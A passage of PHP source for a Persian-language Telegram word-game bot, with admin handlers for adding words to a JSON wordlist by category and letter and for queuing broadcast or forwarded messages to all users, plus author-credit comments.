$wordlist["wordlist"]["$tab"]["$harf"] = array_values($wordlist["wordlist"]["$tab"]["$harf"]);  
$wordlist = json_encode($wordlist,true);
file_put_contents("data/wordlist.json",$wordlist); 
}
else
{
         Bot('sendmessage',[
        	'chat_id'=>$chat_id,
        	'text'=>"📍 کلمه که میخواهید حذف کنید وجود ندارد",
 ]);
}
}
}
elseif($textmassage=="📍 افزودن کلمه"){
if (in_array($from_id,$Dev)){
Bot('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"📍 بخش مورد نظر خود را برای اضافه کردن کلمه انتخاب کنید",
    'reply_markup'=>json_encode([
            	'keyboard'=>[
								[
				['text'=>"اسم"],['text'=>"فامیل"],['text'=>"کشور"]
				],
										[
				['text'=>"میوه"],['text'=>"حیوان"],['text'=>"غذا"],['text'=>"شهر"]
				],
										[
				['text'=>"رنگ"],['text'=>"ماشین"],['text'=>"گل"],['text'=>"اشیا"]
				],
												[
				['text'=>"برگشت 🔙"]
				],
 	],
            	'resize_keyboard'=>true
       		])
	  	]); 
		}
}
elseif(in_array($textmassage, array("اسم","فامیل","کشور","میوه","حیوان","غذا","رنگ","ماشین","گل","اشیا","شهر"))){
if (in_array($from_id,$Dev)){
         Bot('sendmessage',[
        	'chat_id'=>$chat_id,
        	'text'=>"📍 شما در حال اضافه کردن کلمه به بخش $textmassage هستید 
			
📍 کلمه که میخواهید اضافه کنید مربوط به کدام حرف است",
    'reply_markup'=>json_encode([
            	'keyboard'=>[
												[
				['text'=>"برگشت 🔙"]
				],
 	],
            	'resize_keyboard'=>true
       		])
	  	]);
//ارتقا دهنده دیباگ کننده سورس @DevOscar
//اولین چنل اوپن کننده @Virtualservices_3
//بی ناموسی منبع پاک کنی با افتخار به سعید افکونی		
$juser["userfild"]["gettab"]="$textmassage";
$juser["userfild"]["file"]="getharf";
$juser = json_encode($juser,true);
file_put_contents("data/$from_id.json",$juser);		
}
}
elseif ($juser["userfild"]["file"] == 'getharf') {
if ($textmassage != "برگشت 🔙"){
$horof = array("ا","ب","پ","ت","ج","چ","خ","د","ر","ز","س","ش","ع","ف","ق","ک","گ","ل","م","ن","ه","ی");
if(in_array($textmassage, $horof)) {
         Bot('sendmessage',[
        	'chat_id'=>$chat_id,
        	'text'=>"📍 کلمه که میخواهید اضافه شود را وارد کنید",
	  'reply_to_message_id'=>$message_id,
 ]);
$juser["userfild"]["file"]="addword";
$juser["userfild"]["getharf"]="$textmassage";
$juser = json_encode($juser,true);
file_put_contents("data/$from_id.json",$juser);	
}
else
{
         Bot('sendmessage',[
        	'chat_id'=>$chat_id,
        	'text'=>"📍 باید یکی از حروف الفبا را وارد کنید",
 ]);
}
}
}
elseif ($juser["userfild"]["file"] == 'addword') {
if ($textmassage != "برگشت 🔙"){
$tab = $juser["userfild"]["gettab"];
$harf = $juser["userfild"]["getharf"];
if(!in_array($textmassage, $wordlist["wordlist"]["$tab"]["$harf"])) {
         Bot('sendmessage',[
        	'chat_id'=>$chat_id,
        	'text'=>"اضافه شد ✔️
			
📍 اگر میخواهید کلمه دیگر اضافه کنید ان را ارسال کنید",
	  'reply_to_message_id'=>$message_id,
 ]);
$wordlist["wordlist"]["$tab"]["$harf"][]="$textmassage";
$wordlist = json_encode($wordlist,true);
file_put_contents("data/wordlist.json",$wordlist);	
}
else
{
         Bot('sendmessage',[
        	'chat_id'=>$chat_id,
        	'text'=>"📍 کلمه وارد شده قبلا در لیست کلمات بوده است",
 ]);
}
}
}
elseif ($textmassage == '📍 ارسال به همه' ) {
if (in_array($from_id,$Dev)){
         Bot('sendmessage',[
        	'chat_id'=>$chat_id,
        	'text'=>"لطفا متن خود را ارسال کنید 🚀",
	  'reply_to_message_id'=>$message_id,
	   'reply_markup'=>json_encode([
    'keyboard'=>[
	[
	['text'=>"برگشت 🔙"] 
	]
   ],
      'resize_keyboard'=>true
   ])
 ]);
$juser["userfild"]["file"]="sendtoall";
$juser = json_encode($juser,true);
file_put_contents("data/$from_id.json",$juser);		
}
}
elseif ($juser["userfild"]["file"] == 'sendtoall') {
if ($textmassage != "برگشت 🔙") {
         Bot('sendmessage',[
        	'chat_id'=>$chat_id,
        	'text'=>"پیام شما با موفقیت برای ارسال همگانی تنظیم شد  ✔️",
	  'reply_to_message_id'=>$message_id,
 ]);
$inuser = json_decode(file_get_contents("user.json"),true);
$inuser["text"]="$textmassage";
$inuser["sendtoall"]="true";
$inuser = json_encode($inuser,true);
file_put_contents("user.json",$inuser);	
$juser["userfild"]["file"]="none";
$juser = json_encode($juser,true);
file_put_contents("data/$from_id.json",$juser);	
}
}
elseif ($textmassage == '📍 فروارد همگانی' ) {
if (in_array($from_id,$Dev)){
         Bot('sendmessage',[
        	'chat_id'=>$chat_id,
        	'text'=>"لطفا متن خود را فوروارد کنید  🚀",
	  'reply_to_message_id'=>$message_id,
	   'reply_markup'=>json_encode([
    'keyboard'=>[
	[
	['text'=>"برگشت 🔙"] 
	]
   ],
      'resize_keyboard'=>true
   ])
 ]);
$juser["userfild"]["file"]="fortoall";
$juser = json_encode($juser,true);
file_put_contents("data/$from_id.json",$juser);		
}
}
elseif ($juser["userfild"]["file"] == 'fortoall') {
if ($textmassage != "برگشت 🔙") {
         Bot('sendmessage',[
        	'chat_id'=>$chat_id,
        	'text'=>"پیام شما با موفقیت به عنوان فوروارد همگانی تنظیم شد ✔️",
	  'reply_to_message_id'=>$message_id,
 ]);
$inuser = json_decode(file_get_contents("user.json"),true);
$inuser["msg"]="$message_id";
$inuser["chat"]="$chat_id";
$inuser["fortoall"]="true";
$inuser = json_encode($inuser,true);
file_put_contents("user.json",$inuser);	
$juser["userfild"]["file"]="none";
$juser = json_encode($juser,true);
file_put_contents("data/$from_id.json",$juser);		
}
}
//ارتقا دهنده دیباگ کننده سورس @DevOscar
//اولین چنل اوپن کننده @Virtualservices_3
//بی ناموسی منبع پاک کنی با افتخار به سعید افکونی
?>
